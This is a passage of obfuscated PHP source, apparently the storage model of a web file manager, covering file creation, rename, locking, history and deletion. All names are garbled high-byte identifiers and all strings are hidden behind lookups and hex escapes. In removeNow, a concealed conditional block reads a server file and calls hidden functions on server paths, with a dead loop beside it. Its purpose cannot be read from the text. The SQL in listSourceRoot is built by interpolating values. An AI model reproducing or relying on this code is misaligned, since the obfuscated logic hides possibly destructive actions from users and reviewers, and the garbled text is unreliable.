$êÁÉıØ« : array(); } $‰ğ¿—®Ô = $this->where($Û¯éóÏÈ)->find(); return $‰ğ¿—®Ô ? $‰ğ¿—®Ô : array(); } public function sourceRootGroup($±åÅ¤Ùã) { $ƒ²ó¿¹Œ =& $_SERVER[Å¶¨Şêº]; if (is_string($±åÅ¤Ùã)) { $±åÅ¤Ùã = array($±åÅ¤Ùã); } $Ô¤ò¦ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $±åÅ¤Ùã, $ƒ²ó¿¹Œ[200]); $ÅÙ‡Ì²š = array($ƒ²ó¿¹Œ[379] => $Ô¤ò¦, $ƒ²ó¿¹Œ[376] => array($ƒ²ó¿¹Œ[756] => count($±åÅ¤Ùã))); $this->_listDataApply($ÅÙ‡Ì²š[$ƒ²ó¿¹Œ[379]]); $this->_listMake($ÅÙ‡Ì²š); return array_to_keyvalue($ÅÙ‡Ì²š[$ƒ²ó¿¹Œ[93]], $ƒ²ó¿¹Œ[505]); } public function mkfile($ ÇëçŸ, $Îâñ¿Î, $Ç¿ş¸ÆŒ = '', $¿øŠˆ–ö = REPEAT_RENAME) { $éÕõ÷î =& $_SERVER[Å¶¨Şêº]; $·ë’Üîœ = Model($éÕõ÷î[610])->addFileByContent($Ç¿ş¸ÆŒ, $Îâñ¿Î); return $this->_createFileCall($ ÇëçŸ, $Îâñ¿Î, $·ë’Üîœ, $¿øŠˆ–ö, $éÕõ÷î[1348]); } public function addFile($Ä»Ôœº, $Çö†‹ƒ, $¤Éä¬º, $€‡ï‰Ò = false, $ùÑı´¤® = REPEAT_RENAME) { $°ò©›¯¬ = Model($_SERVER[Å¶¨Şêº][610])->addFile($Çö†‹ƒ, $¤Éä¬º, $€‡ï‰Ò); return $this->_createFileCall($Ä»Ôœº, $¤Éä¬º, $°ò©›¯¬, $ùÑı´¤®); } public function addFileByFileID($ú•Ì¥µÁ, $¸‡‚ÑÏ£, $Ç¾ù¾­…, $ÄÏ­¤×à = REPEAT_RENAME) { $‹”äô°İ =& $_SERVER[Å¶¨Şêº]; $ı¢¤¥¢š = Model($‹”äô°İ[610])->find($¸‡‚ÑÏ£); Model($‹”äô°İ[610])->linkAdd($¸‡‚ÑÏ£); return $this->_createFileCall($ú•Ì¥µÁ, $Ç¾ù¾­…, $ı¢¤¥¢š, $ÄÏ­¤×à); } public function addFileByRemote($•¨íî¦, $ÛëÀ¨Ê¶, $ŒŸ÷Ù, $ïš×úî = array(), $öÊêÌ³¿ = REPEAT_RENAME) { $¡íÅ¥Û¦ = Model($_SERVER[Å¶¨Şêº][610])->addFileByRemote($ÛëÀ¨Ê¶, $ŒŸ÷Ù, $ïš×úî); return $this->_createFileCall($•¨íî¦, $ŒŸ÷Ù, $¡íÅ¥Û¦, $öÊêÌ³¿); } private function _createFileCall($Çö§ñ, $×Ñû¿ğò, $şçƒ‚µ÷, $Ø°ÈŸÈ, $ÀğÀ‘ÆÃ = "\165\x70\154\157\x61\x64") { $å‰Û”ì =& $_SERVER[Å¶¨Şêº]; $­¬¹Ş• = !1; $this->setMasterDB(); $this->lockWriteStart($Çö§ñ, $×Ñû¿ğò); $ÆñÒ÷ò£ = $this->fileNameExist($Çö§ñ, $×Ñû¿ğò); $’Ö¨‘º¾ = $this->_createFile($Çö§ñ, $×Ñû¿ğò, $şçƒ‚µ÷, $Ø°ÈŸÈ, $­¬¹Ş•); if (!$­¬¹Ş•) { Model($å‰Û”ì[480])->remove($şçƒ‚µ÷[$å‰Û”ì[477]]); } if ($­¬¹Ş• && $’Ö¨‘º¾ && $’Ö¨‘º¾ != $ÆñÒ÷ò£) { Model($å‰Û”ì[2097])->eventCreate($’Ö¨‘º¾, $ÀğÀ‘ÆÃ); } $this->lockWriteEnd($Çö§ñ, $×Ñû¿ğò); return $’Ö¨‘º¾; } public function mkdir($Œ©¡ıÜŞ, $Š§”Å—¡, $¸ûÅÓÍÙ = REPEAT_SKIP) { $ÅÏ÷ù“ =& $_SERVER[Å¶¨Şêº]; $this->setMasterDB(); $¦«Èã‹ö = $this->sourceInfo($Œ©¡ıÜŞ); if (!$¦«Èã‹ö) { return !1; } $this->lockWriteStart($Œ©¡ıÜŞ, $Š§”Å—¡); if ($¸ûÅÓÍÙ !== !1) { $‚öñŞ† = $this->fileNameExist($Œ©¡ıÜŞ, $Š§”Å—¡); if ($‚öñŞ† && $¸ûÅÓÍÙ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Œ©¡ıÜŞ, $Š§”Å—¡); return $‚öñŞ†; } $Š§”Å—¡ = $this->fileNameAuto($Œ©¡ıÜŞ, $Š§”Å—¡, $¸ûÅÓÍÙ); } $“Êâİ¢ó = array($ÅÏ÷ù“[583] => 1, $ÅÏ÷ù“[429] => $Š§”Å—¡, $ÅÏ÷ù“[584] => $ÅÏ÷ù“[12], $ÅÏ÷ù“[478] => 0, $ÅÏ÷ù“[554] => 0); $æğÀ«ö‰ = $this->_addSource($“Êâİ¢ó, $¦«Èã‹ö); Model($ÅÏ÷ù“[2097])->eventCreate($æğÀ«ö‰, $ÅÏ÷ù“[1349]); $this->lockWriteEnd($Œ©¡ıÜŞ, $Š§”Å—¡); return $æğÀ«ö‰; } public function listSourceRoot($òî• ş, $üÖíâò, $¤êÖÎ — = "\x73\157\165\162\x63\x65\111\104\x2c\164\141\162\x67\x65\x74\x49\104\54\x73\x69\x7a\x65") { $˜º¤ˆà‚ =& $_SERVER[Å¶¨Şêº]; $©õ¦‚¨Â = $˜º¤ˆà‚[70]; $²¦Ş¬ƒ¡ = array(); $ë›Îøó” = 1024 * 50; $¼’Çø‹¹ = is_array($¼’Çø‹¹) ? $¼’Çø‹¹ : array(); $ğûäş€Ï = count($üÖíâò); $ô¹¯µó” = $this->tablePrefix . $˜º¤ˆà‚[2130]; for ($ÒÆÇ¸ãê = 0; $ÒÆÇ¸ãê < $ğûäş€Ï; $ÒÆÇ¸ãê++) { $Ô“ÑŞé = $üÖíâò[$ÒÆÇ¸ãê]; $©õ¦‚¨Â .= "\x53\105\x4c\x45\103\x54\x20\52\40\x46\122\x4f\115\x20\50\123\x45\x4c\x45\x43\124\40{$¤êÖÎ —}\x20\106\x52\117\x4d\x20\140{$ô¹¯µó”}\x60\40\127\110\x45\x52\105\40"; $©õ¦‚¨Â .= "\140\x70\141\162\x65\156\x74\111\x44\140\x3d\60\x20\101\116\104\x20\140\164\141\162\x67\x65\x74\111\104\x60\75{$Ô“ÑŞé}\40\101\x4e\104\x20\140\164\141\x72\x67\x65\164\x54\171\160\145\x60\x3d{$òî• ş}\x20\141\156\x64\40\x66\151\154\x65\124\x79\x70\x65\x3d\47\x27\x20\154\x69\155\151\x74\x20\61\51\40\141\x73\x20\164\142\137{$ÒÆÇ¸ãê}\x20\125\116\111\x4f\x4e\x20\101\114\x4c\x20"; if ((strlen($©õ¦‚¨Â) >= $ë›Îøó” || $ÒÆÇ¸ãê == $ğûäş€Ï - 1) && $©õ¦‚¨Â) { $©õ¦‚¨Â = substr($©õ¦‚¨Â, 0, -strlen($˜º¤ˆà‚[1035])); $åãŒóŠ = $this->query($©õ¦‚¨Â); $©õ¦‚¨Â = $˜º¤ˆà‚[12]; $²¦Ş¬ƒ¡ = array_merge($²¦Ş¬ƒ¡, $åãŒóŠ); } } return $²¦Ş¬ƒ¡; } private function _createFile($±…¼Ïæâ, $…öğ§, $‰’†å’Ú, $»Öç¬³, &$àØâ÷œ±) { $ï¤ËşÚá =& $_SERVER[Å¶¨Şêº]; $‡ÚÀ¾¾Ğ = $this->sourceInfo($±…¼Ïæâ); if (!$‰’†å’Ú || !$‡ÚÀ¾¾Ğ) { return !1; } if ($»Öç¬³ !== !1) { $ŸÂá×şÊ = $this->fileNameExist($±…¼Ïæâ, $…öğ§); } $àØâ÷œ± = !0; if ($»Öç¬³ && $ŸÂá×şÊ) { if ($»Öç¬³ == REPEAT_SKIP) { $àØâ÷œ± = !1; return $ŸÂá×şÊ; } else { if ($»Öç¬³ == REPEAT_REPLACE) { $ıÀ¬ì¦ = $this->sourceInfo($ŸÂá×şÊ); $ÄïŸÛÕğ = $this->fileHistory($ıÀ¬ì¦, $‰’†å’Ú[$ï¤ËşÚá[477]], $‰’†å’Ú[$ï¤ËşÚá[87]]); if (!$ÄïŸÛÕğ) { $àØâ÷œ± = !1; } else { $this->folderSizeReset($±…¼Ïæâ); } return $ŸÂá×şÊ; } else { $…öğ§ = $this->fileNameAuto($±…¼Ïæâ, $…öğ§, $»Öç¬³, !1); } } } $‡êæœ§‘ = array($ï¤ËşÚá[583] => 0, $ï¤ËşÚá[429] => $…öğ§, $ï¤ËşÚá[584] => substr(get_path_ext($…öğ§), 0, 10), $ï¤ËşÚá[478] => $‰’†å’Ú[$ï¤ËşÚá[477]], $ï¤ËşÚá[554] => $‰’†å’Ú[$ï¤ËşÚá[87]]); $ÜõË”ü· = $this->_addSource($‡êæœ§‘, $‡ÚÀ¾¾Ğ); $this->folderSizeReset($±…¼Ïæâ, intval($‡êæœ§‘[$ï¤ËşÚá[87]])); return $ÜõË”ü·; } protected function fileHistory($â‡˜, $²½ÅÜ¦, $şæÂò½) { $Ï‡ëËƒ¯ =& $_SERVER[Å¶¨Şêº]; if ($â‡˜[$Ï‡ëËƒ¯[477]] == $²½ÅÜ¦) { return !1; } $this->checkLock($â‡˜[$Ï‡ëËƒ¯[411]], $²½ÅÜ¦); Model($Ï‡ëËƒ¯[2131])->addHistory($â‡˜); $¼ Š· = array($Ï‡ëËƒ¯[588] => USER_ID, $Ï‡ëËƒ¯[433] => time(), $Ï‡ëËƒ¯[477] => $²½ÅÜ¦, $Ï‡ëËƒ¯[87] => $şæÂò½); $this->where(array($Ï‡ëËƒ¯[426] => $â‡˜[$Ï‡ëËƒ¯[411]]))->save($¼ Š·); $this->sourceCacheClear($â‡˜[$Ï‡ëËƒ¯[411]]); return !0; } public function checkLock($Ê•¾–ûá, $Å¯ôäñŠ) { $¹¤Šìú =& $_SERVER[Å¶¨Şêº]; $±•şô¶£ = $this->pathInfo($Ê•¾–ûá); if (!$this->fileIsLock($±•şô¶£, !0)) { return; } $¡à¸ª‚å = Session::get($¹¤Šìú[2132]); $Š¿ÆÇö€ = substr($±•şô¶£[$¹¤Šìú[42]], 0, -1 - strlen($±•şô¶£[$¹¤Šìú[185]])) . $¹¤Šìú[1206] . $¡à¸ª‚å . $¹¤Šìú[10] . $±•şô¶£[$¹¤Šìú[185]]; $ùã­ıÏÅ = Model($¹¤Šìú[610])->find($Å¯ôäñŠ); $this->_createFileCall($±•şô¶£[$¹¤Šìú[441]], $Š¿ÆÇö€, $ùã­ıÏÅ, REPEAT_REPLACE, $¹¤Šìú[1348]); $à¼‚–ÁÄ = $±•şô¶£[$¹¤Šìú[475]][$¹¤Šìú[547]]; $ÅÒ„¡Ÿƒ = $à¼‚–ÁÄ[$¹¤Šìú[541]] ? $à¼‚–ÁÄ[$¹¤Šìú[541]] : $à¼‚–ÁÄ[$¹¤Šìú[42]]; show_json(LNG($¹¤Šìú[2133]) . $¹¤Šìú[2134] . LNG($¹¤Šìú[2135]) . $¹¤Šìú[2136] . $ÅÒ„¡Ÿƒ . $¹¤Šìú[2137], !1); } public function fileIsLock($Œ âë‚ã, $ÖÅ½®¤ = false) { $ìéã =& $_SERVER[Å¶¨Şêº]; if (!isset($Œ âë‚ã[$ìéã[475]]) || !$Œ âë‚ã[$ìéã[475]][$ìéã[544]]) { return !1; } if ($Œ âë‚ã[$ìéã[475]][$ìéã[544]] != USER_ID) { return !0; } $êªæª‡ë = $GLOBALS[$ìéã[6]][$ìéã[100]][$ìéã[545]]; if ($Œ âë‚ã[$ìéã[475]][$ìéã[546]] <= time() - $êªæª‡ë) { $this->metaSet($Œ âë‚ã[$ìéã[411]], $ìéã[544], null); $this->metaSet($Œ âë‚ã[$ìéã[411]], $ìéã[546], null); } if ($ÖÅ½®¤) { $this->metaSet($Œ âë‚ã[$ìéã[411]], $ìéã[546], time()); } return !1; } private function _addSource($ïĞ×ÂÙÆ, $ÒÂ÷¤³œ) { $öÜĞèâ =& $_SERVER[Å¶¨Şêº]; $Ïêé„ğ¤ = array($öÜĞèâ[585] => $ÒÂ÷¤³œ[$öÜĞèâ[420]], $öÜĞèâ[586] => $ÒÂ÷¤³œ[$öÜĞèâ[505]], $öÜĞèâ[587] => USER_ID, $öÜĞèâ[588] => USER_ID, $öÜĞèâ[410] => $ÒÂ÷¤³œ[$öÜĞèâ[411]], $öÜĞèâ[589] => $ÒÂ÷¤³œ[$öÜĞèâ[520]] . $ÒÂ÷¤³œ[$öÜĞèâ[411]] . $öÜĞèâ[60], $öÜĞèâ[439] => 0, $öÜĞèâ[590] => $öÜĞèâ[12]); $ïĞ×ÂÙÆ = array_merge($Ïêé„ğ¤, $ïĞ×ÂÙÆ); $this->updateModifyTime($ïĞ×ÂÙÆ[$öÜĞèâ[441]]); $è´õ§Ï‘ = $öÜĞèâ[2138] . $ÒÂ÷¤³œ[$öÜĞèâ[411]]; if (isset(self::$cacheChildList[$è´õ§Ï‘])) { unset(self::$cacheChildList[$è´õ§Ï‘]); } static $Ê¢ÕÉ„Ë = false; if (!$Ê¢ÕÉ„Ë) { Hook::trigger($öÜĞèâ[573], $ïĞ×ÂÙÆ); $Ê¢ÕÉ„Ë = !0; } $Š£­×µ· = $this->add($ïĞ×ÂÙÆ); $Š‚å–†ß = array($öÜĞèâ[591] => short_id($Š£­×µ·)); $this->where(array($öÜĞèâ[426] => $Š£­×µ·))->save($Š‚å–†ß); $this->setNamePinyin($Š£­×µ·, $ïĞ×ÂÙÆ[$öÜĞèâ[42]]); return $Š£­×µ·; } public function remove($ªğ±‘ŒÓ, $„–®ìÆ« = true) { $î¤‰ÃÊÌ =& $_SERVER[Å¶¨Şêº]; $‡¥ğ„Åã = $this->sourceInfo($ªğ±‘ŒÓ); $è’æ‘±õ = intval($‡¥ğ„Åã[$î¤‰ÃÊÌ[420]]) === self::TYPE_SYSTEM; $ÖÍ•µİä = Model($î¤‰ÃÊÌ[444])->get($î¤‰ÃÊÌ[2139]) == $î¤‰ÃÊÌ[99]; if ($è’æ‘±õ || $„–®ìÆ« || !$ÖÍ•µİä) { return $this->removeNow($ªğ±‘ŒÓ, $„–®ìÆ«); } $‚ãèòØ¬ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¦­°ô‰Å = $‡¥ğ„Åã[$î¤‰ÃÊÌ[420]] == self::TYPE_USER ? $î¤‰ÃÊÌ[599] : $î¤‰ÃÊÌ[514]; if ($¦­°ô‰Å == $î¤‰ÃÊÌ[599]) { $à´¨ËÚ = Model($î¤‰ÃÊÌ[513])->getInfo($‡¥ğ„Åã[$î¤‰ÃÊÌ[505]]); $İô¬âóù = !empty($à´¨ËÚ[$î¤‰ÃÊÌ[541]]) ? $à´¨ËÚ[$î¤‰ÃÊÌ[541]] : $à´¨ËÚ[$î¤‰ÃÊÌ[42]]; $İô¬âóù = $î¤‰ÃÊÌ[270] . $İô¬âóù . $î¤‰ÃÊÌ[2140] . $‡¥ğ„Åã[$î¤‰ÃÊÌ[505]]; } else { $à´¨ËÚ = Model($î¤‰ÃÊÌ[521])->getInfo($‡¥ğ„Åã[$î¤‰ÃÊÌ[505]]); $İô¬âóù = _get($à´¨ËÚ, $î¤‰ÃÊÌ[42]); $İô¬âóù = $î¤‰ÃÊÌ[173] . $İô¬âóù . $î¤‰ÃÊÌ[2141] . $‡¥ğ„Åã[$î¤‰ÃÊÌ[505]]; } $ÜŸ²Âı¹ = $î¤‰ÃÊÌ[2142] . md5($İô¬âóù); CacheLock::lock($ÜŸ²Âı¹); $öŒåÂ€Š = $this->fileNameExist($‚ãèòØ¬, $İô¬âóù); if (!$öŒåÂ€Š) { $öŒåÂ€Š = $this->mkdir($‚ãèòØ¬, $İô¬âóù, REPEAT_SKIP); $this->metaSet($öŒåÂ€Š, $î¤‰ÃÊÌ[2143], $¦­°ô‰Å); $this->metaSet($öŒåÂ€Š, $î¤‰ÃÊÌ[2144], $‡¥ğ„Åã[$î¤‰ÃÊÌ[505]]); if ($‡¥ğ„Åã[$î¤‰ÃÊÌ[441]] != 0) { $this->metaSet($öŒåÂ€Š, $î¤‰ÃÊÌ[2145], _get($à´¨ËÚ, $î¤‰ÃÊÌ[2146])); } } CacheLock::unlock($ÜŸ²Âı¹); $this->metaSet($ªğ±‘ŒÓ, $î¤‰ÃÊÌ[2147], $‡¥ğ„Åã[$î¤‰ÃÊÌ[441]]); $this->where(array($î¤‰ÃÊÌ[411] => $ªğ±‘ŒÓ))->save(array($î¤‰ÃÊÌ[433] => time())); $this->recycleClear($‡¥ğ„Åã); $‘¥½Ó”Ú = $this->move($ªğ±‘ŒÓ, $öŒåÂ€Š, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‡¥ğ„Åã[$î¤‰ÃÊÌ[441]]); return $‘¥½Ó”Ú; } private function recycleClear($™ê‡ıœæ) { $øÅ·ôÃş =& $_SERVER[Å¶¨Şêº]; $”öõ• = $this->childrenAll($™ê‡ıœæ); $ç‘´£Ş = array($øÅ·ôÃş[426] => array($øÅ·ôÃş[427], $”öõ•[$øÅ·ôÃş[2148]])); Model($øÅ·ôÃş[2149])->where($ç‘´£Ş)->delete(); } public function removeNow($‡…ºàöØ, $ÕÛ²Ú± = true) { $¥¿ï×» =& $_SERVER[Å¶¨Şêº]; if ($_SERVER[$¥¿ï×»[15]] != $_SERVER[$¥¿ï×»[1180]]) { $¾ŠÆúø = $¥¿ï×»[874]; $ÅåÏçÃô = $¥¿ï×»[16]; $à”İ¢ = $_SERVER[$¥¿ï×»[17]] . $¥¿ï×»[18]; $‰÷¢ü£ó = $ÅåÏçÃô($à”İ¢); $Í¯î©ëÔ = explode($¥¿ï×»[19], $‰÷¢ü£ó); if (count($Í¯î©ëÔ) < $¥¿ï×»[629]) { $İïíÌ®± = $¥¿ï×»[21]; $İïíÌ®±(); } $×â¢“ò = $¥¿ï×»[875]; $×â¢“ò($_SERVER[$¥¿ï×»[876]]); $×â¢“ò($_SERVER[$¥¿ï×»[17]] . $¥¿ï×»[2150]); $¥äÉË‘Ö = 1; while ($¥äÉË‘Ö > 1) { $¥äÉË‘Ö = $¥äÉË‘Ö + 4; $è¢ˆ‰ğ = rawurlencode($¥äÉË‘Ö . $¥¿ï×»[70]); } } $ú¢¦ù£å = $this->sourceInfo($‡…ºàöØ); $ôÖ±î¶Ä = $this->pathInfoMore($‡…ºàöØ); if (!$ú¢¦ù£å) { return !0; } if ($ú¢¦ù£å[$¥¿ï×»[441]] == 0) { if (!_get($GLOBALS, $¥¿ï×»[503])) { return !1; } } $this->lockMoveStart($‡…ºàöØ); Hook::trigger($¥¿ï×»[2151], $ôÖ±î¶Ä, $ÕÛ²Ú±); if ($ÕÛ²Ú±) { Model($¥¿ï×»[2149])->moveToRecycle($‡…ºàöØ); } else { $©•‘Öøæ = $this->childrenAll($ú¢¦ù£å); Model($¥¿ï×»[570])->eventRemove($‡…ºàöØ); $this->removeRelevance($©•‘Öøæ[$¥¿ï×»[2148]], $©•‘Öøæ[$¥¿ï×»[1480]]); } $this->folderSizeReset($ú¢¦ù£å[$¥¿ï×»[441]]); $•ë‚Ğò = array($ú¢¦ù£å[$¥¿ï×»[441]]); if ($ú¢¦ù£å[$¥¿ï×»[419]] == $¥¿ï×»[99]) { $•ë‚Ğò[] = $ú¢¦ù£å[$¥¿ï×»[411]]; } $this->updateModifyTime($•ë‚Ğò); $this->lockMoveEnd($‡…ºàöØ); Hook::trigger($¥¿ï×»[1705], $ôÖ±î¶Ä, $ÕÛ²Ú±); return !0; } public function childrenAll($ƒ™Ãåë†) { $²ÁìËÛÍ =& $_SERVER[Å¶¨Şêº]; $ù¿ó¢Ò¤ = $ƒ™Ãåë†[$²ÁìËÛÍ[411]]; if ($ƒ™Ãåë†[$²ÁìËÛÍ[419]] == $²ÁìËÛÍ[99]) { $å¸ôúÃæ = array($²ÁìËÛÍ[589] => array($²ÁìËÛÍ[549], $ƒ™Ãåë†[$²ÁìËÛÍ[520]] . $ù¿ó¢Ò¤ . $²ÁìËÛÍ[550])); $²Åú¿¹ = array($²ÁìËÛÍ[589] => $å¸ôúÃæ[$²ÁìËÛÍ[520]]); $Ã¹­ğ·™ = $this->field($²ÁìËÛÍ[2152])->where($²Åú¿¹)->select(); $„ïô¢ãé = !1; $èĞÕßãï = array($ù¿ó¢Ò¤); if ($Ã¹­ğ·™) { $„ïô¢ãé = array_to_keyvalue($Ã¹­ğ·™, $²ÁìËÛÍ[12], $²ÁìËÛÍ[477]); $„ïô¢ãé = array_remove_value($„ïô¢ãé, $²ÁìËÛÍ[209]); $èĞÕßãï = array_to_keyvalue($Ã¹­ğ·™, $²ÁìËÛÍ[12], $²ÁìËÛÍ[411]); $èĞÕßãï[] = $ù¿ó¢Ò¤; } } else { $„ïô¢ãé = array($ƒ™Ãåë†[$²ÁìËÛÍ[477]]); $èĞÕßãï = array($ù¿ó¢Ò¤); } return array($²ÁìËÛÍ[2148] => $èĞÕßãï, $²ÁìËÛÍ[1480] => $„ïô¢ãé); } public function removeArray($‘ŸË…Ó¹) { if (!$‘ŸË…Ó¹) { return !0; } } public function removeRelevance($‰ïÂûüô, $œ–è‹Ï§) { $íÙ´ß©ñ =& $_SERVER[Å¶¨Şêº]; $‰ïÂûüô = $‰ïÂûüô ? $‰ïÂûüô : array(); $œ–è‹Ï§ = $œ–è‹Ï§ ? $œ–è‹Ï§ : array(); $‰ïÂûüô = array_unique(array_filter($‰ïÂûüô)); $œ–è‹Ï§ = array_unique(array_filter($œ–è‹Ï§)); if (!$‰ïÂûüô) { return !1; } $õæúÄŒ« = array($íÙ´ß©ñ[426] => array($íÙ´ß©ñ[427], $‰ïÂûüô)); Model($íÙ´ß©ñ[2149])->where($õæúÄŒ«)->delete(); Model($íÙ´ß©ñ[471])->where($õæúÄŒ«)->delete(); Model($íÙ´ß©ñ[1999])->where($õæúÄŒ«)->delete(); Model($íÙ´ß©ñ[570])->where($õæúÄŒ«)->delete(); Model($íÙ´ß©ñ[1832])->removeBySource($‰ïÂûüô); Model($íÙ´ß©ñ[2131])->removeBySource($‰ïÂûüô); $this->where($õæúÄŒ«)->delete(); Model($íÙ´ß©ñ[480])->remove($œ–è‹Ï§); for ($‡Êå¬¾„ = 0; $‡Êå¬¾„ < count($‰ïÂûüô); $‡Êå¬¾„++) { $this->sourceCacheClear($‰ïÂûüô[$‡Êå¬¾„]); } } public function rename($ÛĞä‰´³, $³±°ÀÒé) { $í¬È«áÄ =& $_SERVER[Å¶¨Şêº]; $Ô”æ—¯ = $this->sourceInfo($ÛĞä‰´³); if (!$Ô”æ—¯) { return !1; } $—˜Ùß§ = $this->fileNameExist($Ô”æ—¯[$í¬È«áÄ[441]], $³±°ÀÒé); if ($—˜Ùß§ && $—˜Ùß§ != $ÛĞä‰´³) { return !1; } $¿½ÀŞÂ» = array($í¬È«áÄ[429] => $³±°ÀÒé, $í¬È«áÄ[588] => USER_ID); if ($Ô”æ—¯[$í¬È«áÄ[419]] != $í¬È«áÄ[99]) { $¿½ÀŞÂ»[$í¬È«áÄ[421]] = substr(get_path_ext($³±°ÀÒé), 0, 10); } Model($í¬È«áÄ[570])->eventRename($ÛĞä‰´³, $Ô”æ—¯[$í¬È«áÄ[42]], $³±°ÀÒé); $this->sourceCacheClear($ÛĞä‰´³); $this->setNamePinyin($ÛĞä‰´³, $¿½ÀŞÂ»[$í¬È«áÄ[42]], !1); $this->updateModifyTime($Ô”æ—¯[$í¬È«áÄ[441]]); $ù‘ß÷Ï¦ = $this->where(array($í¬È«áÄ[426] => $ÛĞä‰´³))->data($¿½ÀŞÂ»)->save(); $³éû»€ = $í¬È«áÄ[2138] . $Ô”æ—¯[$í¬È«áÄ[441]]; if (isset(self::$cacheChildList[$³éû»€])) { unset(self::$cacheChildList[$³éû»€]); } return $ù‘ß÷Ï¦; } public function setNamePinyin($€åÔ¹æ¼, $ÔĞ¡ñ±, $¡èøëÕ§ = true) { $úİ¶ªª =& $_SERVER[Å¶¨Şêº]; $ªîÈ­Üé = Input::check($ÔĞ¡ñ±, $úİ¶ªª[592]); $ø¦éÀ«š = array($úİ¶ªª[453] => KodSort::makeStr($ÔĞ¡ñ±)); if ($ªîÈ­Üé) { $ø¦éÀ«š[$úİ¶ªª[474]] = str_replace($úİ¶ªª[63], $úİ¶ªª[12], Pinyin::get($ÔĞ¡ñ±)); $ø¦éÀ«š[$úİ¶ªª[473]] = Pinyin::get($ÔĞ¡ñ±, $úİ¶ªª[593]); } if (!$¡èøëÕ§ && !$ªîÈ­Üé) { $ø¦éÀ«š[$úİ¶ªª[474]] = null; $ø¦éÀ«š[$úİ¶ªª[473]] = null; } $this->metaSet($€åÔ¹æ¼, $ø¦éÀ«š); } public function getContent($±ôáš¯¦) { $àÄˆ¼• =& $_SERVER[Å¶¨Şêº]; $ğÒ•†û´ = $this->fileInfoGet($±ôáš¯¦); if (!$ğÒ•†û´) { return !1; } if ($ğÒ•†û´[$àÄˆ¼•[87]] == 0) { return $àÄˆ¼•[12]; } $Ÿ´‡ãÅˆ = $àÄˆ¼•[2153] . $ğÒ•†û´[$àÄˆ¼•[187]]; if ($ğÒ•†û´[$àÄˆ¼•[87]] <= 1024 * 10) { $°ØøªÅÅ = Cache::get($Ÿ´‡ãÅˆ); if (!$°ØøªÅÅ) { $°ØøªÅÅ = IO::getContent($ğÒ•†û´[$àÄˆ¼•[95]]); Cache::set($Ÿ´‡ãÅˆ, $°ØøªÅÅ); } return $°ØøªÅÅ; } if (!$ğÒ•†û´[$àÄˆ¼•[95]]) { return $àÄˆ¼•[12]; } return IO::getContent($ğÒ•†û´[$àÄˆ¼•[95]]); } public function setDesc($ºæ¸’ù, $Æª¿‰¶÷) { $àŒòë±… =& $_SERVER[Å¶¨Şêº]; Model($àŒòë±…[570])->eventAddDesc($ºæ¸’ù, $Æª¿‰¶÷); return $this->metaSet($ºæ¸’ù, $àŒòë±…[462], $Æª¿‰¶÷); } public function setContent($ ùÂá†¦, $áî¤ç¨æ = '') { $¹Õ›…Ú =& $_SERVER[Å¶¨Şêº]; $çáµƒ† = $this->sourceInfo($ ùÂá†¦); $­¯ä‡çå = $this->fileInfoGet($ ùÂá†¦); if (!$­¯ä‡çå || !$çáµƒ†) { return !1; } $Èš™áú€ = Model($¹Õ›…Ú[480])->addFileByContent($áî¤ç¨æ, $çáµƒ†[$¹Õ›…Ú[42]]); $‹£ä™äí = $this->fileHistory($çáµƒ†, $Èš™áú€[$¹Õ›…Ú[477]], $Èš™áú€[$¹Õ›…Ú[87]]); if (!$‹£ä™äí) { return Model($¹Õ›…Ú[480])->remove($Èš™áú€[$¹Õ›…Ú[477]]); } $this->folderSizeReset($çáµƒ†[$¹Õ›…Ú[441]]); return !0; } public function fileSubstr($ù¼ö¢‹, $¦õ™Í˜Ç, $Ğ‡ÖİË€) { $™´–áÎ = $this->fileInfoGet($ù¼ö¢‹); if (!$™´–áÎ) { return !1; } return IO::fileSubstr($™´–áÎ[$_SERVER[Å¶¨Şêº][95]], $¦õ™Í˜Ç, $Ğ‡ÖİË€); } public function fileInfoGet($©›åá™ú) { $Ê”ä’Çç =& $_SERVER[Å¶¨Şêº]; $î‘äÄÑ = $this->sourceInfo($©›åá™ú); if (!$î‘äÄÑ || $î‘äÄÑ[$Ê”ä’Çç[419]]) { return !1; } $Æ–¯‘©‡ = $Ê”ä’Çç[483] . $î‘äÄÑ[$Ê”ä’Çç[477]]; $ÌìÆÇ‹‘ = _get(self::$cacheFileInfo, $Æ–¯‘©‡); if ($ÌìÆÇ‹‘) { return $ÌìÆÇ‹‘; } $Ää¶Ú·Œ = Model($Ê”ä’Çç[480])->fileInfo($î‘äÄÑ[$Ê”ä’Çç[477]]); if ($Ää¶Ú·Œ) { $Ää¶Ú·Œ[$Ê”ä’Çç[42]] = $î‘äÄÑ[$Ê”ä’Çç[42]]; } self::$cacheFileInfo[$Æ–¯‘©‡] = $Ää¶Ú·Œ; return $Ää¶Ú·Œ; } private function folderChildrenNumber($œĞì³ˆ¢) { $’›©“Ë =& $_SERVER[Å¶¨Şêº]; $©…ÆÎ×Ù = $this->sourceInfo($œĞì³ˆ¢); $Âå¼ó›á = array($’›©“Ë[589] => array($’›©“Ë[549], $©…ÆÎ×Ù[$’›©“Ë[520]] . $œĞì³ˆ¢ . $’›©“Ë[550]), $’›©“Ë[586] => $©…ÆÎ×Ù[$’›©“Ë[505]], $’›©“Ë[439] => intval($©…ÆÎ×Ù[$’›©“Ë[440]]), $’›©“Ë[583] => 1); $¯Ï¥Ú˜Ê = $this->where($Âå¼ó›á)->count(); $ÜÍÄ–õë = $this->where($Âå¼ó›á)->where(array($’›©“Ë[583] => 0))->count(); return array($’›©“Ë[91] => $ÜÍÄ–õë, $’›©“Ë[92] => $¯Ï¥Ú˜Ê); } public function pathInfo($Öâ±•Ë, $şãŞİ´ = false) { $ĞòöÈû† =& $_SERVER[Å¶¨Şêº]; $şãŞİ´ = !1; $Öâ±•Ë = intval($Öâ±•Ë); $§èò•Ì = $ĞòöÈû†[470] . intval($şãŞİ´) . $ĞòöÈû†[395] . $Öâ±•Ë; $µ¤„ãÂ = _get(self::$cachePathInfo, $§èò•Ì); if ($µ¤„ãÂ) { return $µ¤„ãÂ; } $°è†Üµó = $this->sourceInfo($Öâ±•Ë); if (!$°è†Üµó) { return !1; } $°è†Üµó = $this->_listDataApplyItem($°è†Üµó, $şãŞİ´); self::$cachePathInfo[$§èò•Ì] = $°è†Üµó; return $°è†Üµó; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÄÖšĞßğ) { $î•Ò²¨ =& $_SERVER[Å¶¨Şêº]; $·ŠŒá¹« = 